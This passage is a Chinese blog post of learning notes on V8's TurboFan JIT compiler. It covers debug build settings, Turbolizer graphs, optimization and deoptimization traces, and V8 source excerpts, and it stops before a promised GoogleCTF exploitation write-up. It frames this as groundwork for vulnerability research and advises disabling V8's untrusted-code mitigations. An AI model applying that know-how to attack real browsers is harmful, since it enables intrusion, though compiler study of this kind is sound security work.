<!DOCTYPE html>


<html lang="zh-CN">


<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="v8, GoogleCTF2020, javascript,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
   
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    浅析 V8-turboFan |  Kiprey&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
</head>

</html>

<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-v8-turboFan"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  浅析 V8-turboFan
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2021/01/v8-turboFan/" class="article-date">
  <time datetime="2021-01-23T07:20:22.000Z" itemprop="datePublished">2021-01-23</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/chrome/">chrome</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">15.3k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">71 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="一、前言">一、前言</h2>
<ul>
<li>
<p>v8 是一种 JS 引擎的实现，它由Google开发，使用C++编写。</p>
<p>v8 被设计用于提高网页浏览器内部 JavaScript 代码执行的性能。为了提高性能，v8 将会把 JS 代码转换为更高效的机器码，而非传统的使用解释器执行。因此 v8 引入了 <strong>JIT (Just-In-Time)</strong> 机制，该机制将会在运行时动态编译 JS 代码为机器码，以提高运行速度。</p>
</li>
<li>
<p>TurboFan是 v8 的优化编译器之一，它使用了 <a href="https://darksi.de/d.sea-of-nodes/" target="_blank" rel="noopener">sea of nodes</a> 这个编译器概念。</p>
<blockquote>
<p>sea of nodes 不是单纯的指某个图的结点，它是一种<strong>特殊中间表示</strong>的图。</p>
<p>它的表示形式与一般的CFG/DFG不同，其具体内容请查阅上面的连接。</p>
</blockquote>
<p>TurboFan的相关源码位于<code>v8/compiler</code>文件夹下。</p>
<a id="more"></a>
</li>
<li>
<p>这是笔者初次学习v8 turboFan所写下的笔记，内容包括但不限于turboFan运行参数的使用、部分<code>OptimizationPhases</code>的工作机理，以及拿来练手的<code>GoogleCTF 2018(Final) Just-In-Time</code>题题解。</p>
<p>该笔记<strong>基于 <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/" target="_blank" rel="noopener">Introduction to TurboFan</a> 并适当拓宽了一部分内容</strong>。如果在阅读文章时发现错误或者存在不足之处，欢迎各位师傅斧正！</p>
</li>
</ul>
<h2 id="二、环境搭建">二、环境搭建</h2>
<ul>
<li>
<p>这里的环境搭建较为简单，首先搭配一个 v8 环境（<strong>必须</strong>，没有 v8 环境要怎么研究 v8， 2333）。这里使用的版本号是<strong>7.0.276.3</strong>。</p>
<blockquote>
<p>如何搭配v8环境？请移步 <a href="https://kiprey.github.io/2020/11/fetch-chromium/">下拉&amp;编译 chromium&amp;v8 代码</a></p>
</blockquote>
<p>这里需要补充一下，v8 的 gn args中必须加一个<code>v8_untrusted_code_mitigations = false</code>的标志，即最后使用的gn args如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Set build arguments here. See `gn help buildargs`.</span></span><br><span class="line">is_debug = true</span><br><span class="line">target_cpu = <span class="string">"x64"</span></span><br><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_slow_dchecks = true</span><br><span class="line">v8_optimized_debug = false</span><br><span class="line"><span class="comment"># 加上这个</span></span><br><span class="line">v8_untrusted_code_mitigations = false</span><br></pre></td></tr></table></figure>
<p>具体原因将在下面讲解<code>CheckBounds</code>结点优化时提到。</p>
</li>
<li>
<p>然后安装一下 v8 的turbolizer，turbolizer将用于调试 v8 TurboFan中<code>sea of nodes</code>图的工具。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8/tools/turbolizer</span><br><span class="line"><span class="comment"># 获取依赖项</span></span><br><span class="line">npm i</span><br><span class="line"><span class="comment"># 构建</span></span><br><span class="line">npm run-script build</span><br><span class="line"><span class="comment"># 直接在turbolizer文件夹下启动静态http服务</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
<blockquote>
<p>构建turbolizer时可能会报一些TypeScript的语法错误ERROR，这些ERROR无伤大雅，不影响turbolizer的功能使用。</p>
</blockquote>
</li>
<li>
<p>turbolizer 的使用方式如下：</p>
<ul>
<li>
<p>首先编写一段测试函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目标优化函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> values = [<span class="number">42</span>,<span class="number">1337</span>];</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="string">"foo"</span>)</span><br><span class="line">      x = <span class="number">5</span>;</span><br><span class="line">                         </span><br><span class="line">    <span class="keyword">let</span> y = x + <span class="number">2</span>;</span><br><span class="line">    y = y + <span class="number">1000</span>;</span><br><span class="line">    y = y * <span class="number">2</span>;</span><br><span class="line">    y = y &amp; <span class="number">10</span>;</span><br><span class="line">    y = y / <span class="number">3</span>;</span><br><span class="line">    y = y &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> values[y];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 必须！在优化该函数前必须先进行一次编译，以便于为该函数提供type feedback</span></span><br><span class="line">opt_me();</span><br><span class="line"><span class="comment">// 必须! 使用v8 natives-syntax来强制优化该函数</span></span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line"><span class="comment">// 必须！ 不调用目标函数则无法执行优化</span></span><br><span class="line">opt_me();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>一定要在执行<code>%OptimizeFunctionOnNextCall(opt_me)</code>之前调用一次目标函数，否则生成的graph将会因为没有type feedback而<strong>导致完全不一样的结果</strong>。</p>
<p>需要注意的是type feedback<strong>有点玄学</strong>，在执行<code>OptimizeFunctionOnNextCall</code>前，如果目标函数内部存在一些边界操作（例如多次使用超过<code>Number.MAX_SAFE_INTEGER</code>大小的整数等），那么调用目标函数的方式<strong>可能</strong>会影响turboFan的功能，包括但不限于传入参数的不同、调用目标函数次数的不同等等等等。</p>
<p>因此在执行<code>%OptimizeFunctionOnNextCall</code>前，目标函数的调用方式，必须自己把握，手动确认<strong>调用几次，传入什么参数</strong>会优化出特定的效果。</p>
</blockquote>
<p>若想优化一个函数，除了可以使用<code>%OptimizeFunctionOnNextCall</code>以外，还可以多次执行该函数（次数要大，建议上for循环）来触发优化。</p>
</li>
<li>
<p>然后使用 d8 执行，不过需要加上<code>--trace-turbo</code>参数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$  ../../v8/v8/out.gn/x64.debug/d8 test.js --allow-natives-syntax --trace-turbo   </span><br><span class="line">Concurrent recompilation has been disabled <span class="keyword">for</span> tracing.</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method opt_me using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method opt_me using Turbofan</span><br></pre></td></tr></table></figure>
<p>之后本地就会生成<code>turbo.cfg</code>和<code>turbo-xxx-xx.json</code>文件。</p>
</li>
<li>
<p>使用浏览器打开<code>127.0.0.1:8000</code>（注意之前在turbolizer文件夹下启动了http服务）</p>
<p>然后点击右上角的3号按钮，在文件选择窗口中选择刚刚生成的<code>turbo-xxx-xx.json</code>文件，之后就会显示以下信息：</p>
<p><img src="/2021/01/v8-turboFan/turbolizer.png" alt="img"></p>
<p>不过这里的结点只显示了控制结点，如果需要显示全部结点，则先点击一下上方的2号按钮，将结点全部展开，之后再点击1号按钮，重新排列：</p>
<p><img src="/2021/01/v8-turboFan/turbolizer1.png" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h2 id="三、turboFan的代码优化">三、turboFan的代码优化</h2>
<ul>
<li>
<p>我们可以使用 <code>--trace-opt</code>参数来追踪函数的优化信息。以下是函数<code>opt_me</code>被turboFan优化时所生成的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ../../v8/v8/out.gn/x64.debug/d8 test.js --allow-natives-syntax --trace-opt </span><br><span class="line">[manually marking 0x0a7a24823759 &lt;JSFunction opt_me (sfi = 0xa7a24823591)&gt; <span class="keyword">for</span> non-concurrent optimization]</span><br><span class="line">[compiling method 0x0a7a24823759 &lt;JSFunction opt_me (sfi = 0xa7a24823591)&gt; using TurboFan]</span><br><span class="line">[optimizing 0x0a7a24823759 &lt;JSFunction opt_me (sfi = 0xa7a24823591)&gt; - took 53.965, 19.410, 0.667 ms]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>上面输出中的<code>manually marking</code>即我们在代码中手动设置的<code>%OptimizeFunctionOnNextCall</code>。</p>
</blockquote>
<p>我们可以使用 v8 本地语法来查看优化前和优化后的机器码（使用<code>%DisassembleFunction</code>本地语法）</p>
<blockquote>
<p>输出信息过长，这里只截取一部分输出。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ ../../v8/v8/out.gn/x64.debug/d8 test.js --allow-natives-syntax  </span><br><span class="line"></span><br><span class="line">0x2b59fe964c1: [Code]</span><br><span class="line"> - map: 0x05116bd02ae9 &lt;Map&gt;</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = InterpreterEntryTrampoline</span><br><span class="line">compiler = unknown</span><br><span class="line">address = 0x2b59fe964c1</span><br><span class="line"></span><br><span class="line">Instructions (size = 995)</span><br><span class="line">0x2b59fe96500     0  488b5f27       REX.W movq rbx,[rdi+0x27]</span><br><span class="line">0x2b59fe96504     4  488b5b07       REX.W movq rbx,[rbx+0x7]</span><br><span class="line">0x2b59fe96508     8  488b4b0f       REX.W movq rcx,[rbx+0xf]</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">0x2b59ff49541: [Code]</span><br><span class="line"> - map: 0x05116bd02ae9 &lt;Map&gt;</span><br><span class="line">kind = OPTIMIZED_FUNCTION</span><br><span class="line">stack_slots = 5</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = 0x2b59ff49541</span><br><span class="line"></span><br><span class="line">Instructions (size = 212)</span><br><span class="line">0x2b59ff49580     0  488d1df9ffffff REX.W leaq rbx,[rip+0xfffffff9]</span><br><span class="line">0x2b59ff49587     7  483bd9         REX.W cmpq rbx,rcx</span><br><span class="line">0x2b59ff4958a     a  7418           jz 0x2b59ff495a4  &lt;+0x24&gt;</span><br><span class="line">0x2b59ff4958c     c  48ba000000003e000000 REX.W movq rdx,0x3e00000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到，所生成的代码长度从原先的995，优化为212，大幅度优化了代码。</p>
<blockquote>
<p>需要注意的是，即便不使用<code>%OptimizeFunctionOnNextCall</code>，将<code>opt_me</code>函数重复执行一定次数，一样可以触发TurboFan的优化。</p>
</blockquote>
</li>
<li>
<p>细心的小伙伴应该可以在上面环境搭建的图中看到<code>deoptimize</code>反优化。为什么需要反优化？这就涉及到turboFan的优化机制。以下面这个js代码为例（注意：没有使用<code>%OptimizeFunctionOnNextCall</code>）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Player</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wall</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = obj.x + <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="built_in">Math</span>.random();</span><br><span class="line">  x += <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> tmp + x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">  move(<span class="keyword">new</span> Player());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">move(<span class="keyword">new</span> Wall());</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">  move(<span class="keyword">new</span> Wall());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟踪一下该代码的opt以及deopt：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ ../../v8/v8/out.gn/x64.debug/d8 test.js --allow-natives-syntax  --trace-opt --trace-deopt </span><br><span class="line">[marking 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; <span class="keyword">for</span> optimized recompilation, reason: small <span class="keyword">function</span>, ICs with typeinfo: 7/7 (100%), generic ICs: 0/7 (0%)]</span><br><span class="line">[compiling method 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; using TurboFan]</span><br><span class="line">[optimizing 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; - took 6.583, 2.385, 0.129 ms]</span><br><span class="line">[completed optimizing 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt;]</span><br><span class="line"><span class="comment"># 分割线---------------------------------------------------------------------</span></span><br><span class="line">[marking 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; <span class="keyword">for</span> optimized recompilation, reason: hot and stable, ICs with typeinfo: 7/13 (53%), generic ICs: 0/13 (0%)]</span><br><span class="line">[compiling method 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; using TurboFan OSR]</span><br><span class="line">[optimizing 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; - took 3.684, 7.337, 0.409 ms]</span><br><span class="line"><span class="comment"># 分割线---------------------------------------------------------------------</span></span><br><span class="line">[deoptimizing (DEOPT soft): begin 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; (opt <span class="comment">#1) @6, FP to SP delta: 104, caller sp: 0x7ffed15d2a08]</span></span><br><span class="line">            ;;; deoptimize at &lt;test.js:15:6&gt;, Insufficient <span class="built_in">type</span> feedback <span class="keyword">for</span> construct</span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">[deoptimizing (soft): end 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; @6 =&gt; node=154, pc=0x7f0d956522e0, <span class="built_in">caller</span> sp=0x7ffed15d2a08, took 0.496 ms]</span><br><span class="line">[deoptimizing (DEOPT eager): begin 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; (opt <span class="comment">#0) @1, FP to SP delta: 24, caller sp: 0x7ffed15d2990]</span></span><br><span class="line">            ;;; deoptimize at &lt;test.js:5:17&gt;, wrong map</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">[deoptimizing (eager): end 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; @1 =&gt; node=0, pc=0x7f0d956522e0, <span class="built_in">caller</span> sp=0x7ffed15d2990, took 0.355 ms]</span><br><span class="line"><span class="comment"># 分割线---------------------------------------------------------------------</span></span><br><span class="line">[marking 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; <span class="keyword">for</span> optimized recompilation, reason: small <span class="keyword">function</span>, ICs with typeinfo: 7/7 (100%), generic ICs: 0/7 (0%)]</span><br><span class="line">[compiling method 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; using TurboFan]</span><br><span class="line">[optimizing 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt; - took 1.435, 2.427, 0.159 ms]</span><br><span class="line">[completed optimizing 0x3c72eab23a99 &lt;JSFunction move (sfi = 0x3c72eab235f9)&gt;]</span><br><span class="line">[compiling method 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; using TurboFan OSR]</span><br><span class="line">[optimizing 0x3c72eab238e9 &lt;JSFunction (sfi = 0x3c72eab234e9)&gt; - took 3.399, 6.299, 0.239 ms]</span><br></pre></td></tr></table></figure>
<ul>
<li>首先，<code>move</code>函数被标记为可优化的(optimized recompilation)，原因是该函数为small function。然后便开始重新编译以及优化。</li>
<li>之后，<code>move</code>函数再一次被标记为可优化的，原因是<code>hot and stable</code>。这是因为 v8 首先生成的是 <a href="https://v8.dev/docs/ignition" target="_blank" rel="noopener">ignition bytecode</a>。 如果某个函数被重复执行多次，那么TurboFan就会重新生成一些优化后的代码。</li>
</ul>
<blockquote>
<p>以下是获取优化理由的的v8代码。如果该JS函数可被优化，则将在外部的v8函数中，mark该JS函数为待优化的。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">OptimizationReason <span class="title">RuntimeProfiler::ShouldOptimize</span><span class="params">(JSFunction* function,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                   JavaScriptFrame* frame)</span> </span>&#123;</span><br><span class="line">  SharedFunctionInfo* shared = function-&gt;shared();</span><br><span class="line">  <span class="keyword">int</span> ticks = function-&gt;feedback_vector()-&gt;profiler_ticks();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shared-&gt;GetBytecodeArray()-&gt;length() &gt; kMaxBytecodeSizeForOpt) &#123;</span><br><span class="line">    <span class="keyword">return</span> OptimizationReason::kDoNotOptimize;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> ticks_for_optimization =</span><br><span class="line">      kProfilerTicksBeforeOptimization +</span><br><span class="line">      (shared-&gt;GetBytecodeArray()-&gt;length() / kBytecodeSizeAllowancePerTick);</span><br><span class="line">  <span class="comment">// 如果执行次数较多，则标记为HotAndStable</span></span><br><span class="line">  <span class="keyword">if</span> (ticks &gt;= ticks_for_optimization) &#123;</span><br><span class="line">    <span class="keyword">return</span> OptimizationReason::kHotAndStable;</span><br><span class="line">  <span class="comment">// 如果函数较小，则为 small function</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!any_ic_changed_ &amp;&amp; shared-&gt;GetBytecodeArray()-&gt;length() &lt;</span><br><span class="line">                                     kMaxBytecodeSizeForEarlyOpt) &#123;</span><br><span class="line">    <span class="comment">// If no IC was patched since the last tick and this function is very</span></span><br><span class="line">    <span class="comment">// small, optimistically optimize it now.</span></span><br><span class="line">    <span class="keyword">return</span> OptimizationReason::kSmallFunction;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FLAG_trace_opt_verbose) &#123;</span><br><span class="line">    PrintF(<span class="string">"[not yet optimizing "</span>);</span><br><span class="line">    function-&gt;PrintName();</span><br><span class="line">    PrintF(<span class="string">", not enough ticks: %d/%d and "</span>, ticks,</span><br><span class="line">           kProfilerTicksBeforeOptimization);</span><br><span class="line">    <span class="keyword">if</span> (any_ic_changed_) &#123;</span><br><span class="line">      PrintF(<span class="string">"ICs changed]\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      PrintF(<span class="string">" too large for small function optimization: %d/%d]\n"</span>,</span><br><span class="line">             shared-&gt;GetBytecodeArray()-&gt;length(), kMaxBytecodeSizeForEarlyOpt);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> OptimizationReason::kDoNotOptimize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>但接下来就开始<strong>deopt</strong> move函数了，原因是<code>Insufficient type feedback for construct</code>，目标代码是<code>move(new Wall())</code>中的<code>new Wall()</code>。</p>
<p>这是因为turboFan的代码优化<strong>基于推测</strong>，即<code>speculative optimizations</code>。当我们多次执行<code>move(new Player())</code>时，turboFan会猜测move函数的参数总是<code>Player</code>对象，因此将move函数优化为更适合<code>Player</code>对象执行的代码，这样使得<code>Player</code>对象使用move函数时速度将会很快。</p>
<p>这种猜想机制需要一种反馈来动态修改猜想，那么这种反馈就是 <a href="https://mrale.ph/blog/2015/01/11/whats-up-with-monomorphism.html" target="_blank" rel="noopener">type feedback</a>，Ignition instructions将利用 type feedback来帮助TurboFan的<code>speculative optimizations</code>。</p>
<blockquote>
<p>v8源码中，<code>JSFunction</code>类中存在一个类型为<code>FeedbackVector</code>的成员变量，该FeedbackVector将在JS函数被编译后启用。</p>
</blockquote>
<p>因此一旦传入的参数不再是<code>Player</code>类型，即刚刚所说的<code>Wall</code>类型，那么将会使得猜想不成立，因此立即反优化，即<strong>销毁一部分的ignition bytecode并重新生成</strong>。</p>
<p>需要注意的是，反优化机制(<strong>deoptimization</strong>)有着巨大的性能成本，应尽量避免反优化的产生。</p>
</li>
<li>
<p>下一个<code>deopt</code>的原因为<code>wrong map</code>。这里的<strong>map</strong>可以暂时理解为<strong>类型</strong>。与上一条deopt的原因类似，所生成的<code>move</code>优化函数只是针对于<code>Player</code>对象，因此一旦传入一个<code>Wall</code>对象，那么传入的类型就与函数中的类型不匹配，所以只能开始反优化。</p>
</li>
<li>
<p>如果我们在代码中来回使用<code>Player</code>对象和<code>Wall</code>对象，那么TurboFan也会综合考虑，并相应的再次优化代码。</p>
</li>
</ul>
</li>
</ul>
<h2 id="四、turboFan的执行流程">四、turboFan的执行流程</h2>
<ul>
<li>
<p>turboFan的代码优化有多条执行流，其中最常见到的是下面这条：<br>
<img src="/2021/01/v8-turboFan/createGraph-bt1.png" alt="img"></p>
</li>
<li>
<p>从<code>Runtime_CompileOptimized_Concurrent</code>函数开始，设置并行编译&amp;优化 特定的JS函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8\src\runtime\runtime-compiler.cc 46</span></span><br><span class="line">RUNTIME_FUNCTION(Runtime_CompileOptimized_Concurrent) &#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  DCHECK_EQ(<span class="number">1</span>, args.length());</span><br><span class="line">  CONVERT_ARG_HANDLE_CHECKED(JSFunction, function, <span class="number">0</span>);</span><br><span class="line">  <span class="function">StackLimitCheck <span class="title">check</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (check.JsHasOverflowed(kStackSpaceRequiredForCompilation * KB)) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;StackOverflow();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 设置并行模式，之后开始编译与优化</span></span><br><span class="line">  <span class="keyword">if</span> (!Compiler::CompileOptimized(function, ConcurrencyMode::kConcurrent)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ReadOnlyRoots(isolate).exception();</span><br><span class="line">  &#125;</span><br><span class="line">  DCHECK(function-&gt;is_compiled());</span><br><span class="line">  <span class="keyword">return</span> function-&gt;code();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>Compiler::CompileOptimized</code>函数中，继续执行<code>GetOptimizedCode</code>函数，并将可能生成的优化代码传递给<code>JSFunction</code>对象。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8\src\compiler.cc</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Compiler::CompileOptimized</span><span 